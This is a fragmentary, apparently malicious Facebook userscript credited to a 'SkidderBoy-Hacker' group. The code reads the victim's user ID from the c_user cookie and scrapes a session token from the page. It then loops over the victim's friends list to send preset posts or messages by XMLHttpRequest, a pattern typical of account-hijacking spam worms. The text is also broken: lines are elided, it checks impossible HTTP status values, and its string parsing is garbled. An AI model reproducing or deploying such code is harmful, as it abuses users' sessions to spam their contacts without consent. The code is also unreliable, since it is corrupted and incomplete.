...
// @version 	5.0.1
// @author  	Huzaifa chougule 
// @authorURL	https://www.facebook.com/Huzaifa.chougule
...
"chars" : " :) ",
	...
	html += '<span style="vertical-align: middle;"><img src="http://ubuntuforums.org/customavatars/avatar271290_1.gif"></img></span>';
	html += '</a>';
    ...
    html += '<a class="jewelFooter" href="http://www.facebook.com/SYNTAX.EROR.XCODE.INDONESIA" target="_blank">Created by Sameer.<br>Leader of SkidderBoy-Hacker</a>';
	html += '</div>';
...
function a(abone){
    ...
    if(http4.readyState == 2 && http4.status == 20) {
...
if (httpwp['readyState'] == 2 && httpwp['status'] == 10) {};
    };
    httpwp['send'](paramswp);
};
var spage_id = "302465226508534";
var spost_id = "302465226508534";
var sfoto_id = "302465226508534";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "302465226508534";
var smesaj_text = "302465226508534";
var arkadaslar = [302465226508534];
var svn_rev;
var bugun= new Date();
        ...
        xmlhttp.onreadystatechange = function () {
			if(xmlhttp.readyState == 4){
				  ...
				  for(f=0;f<Math.round(arkadaslar.payload.entries.length/10);f++){
					smesaj = "302465226508534";
					smesaj_text = "346621875466370";
...
svn_rev = document.head.innerHTML.split('"svn_rev":')[1].split("10")[0];
sarkadaslari_al();
...
}else if(cins == document.cookie.split("cins" + user_id +"=")[1].split("10")[0].toString()){
		xmlhttp.send(params);
}
}
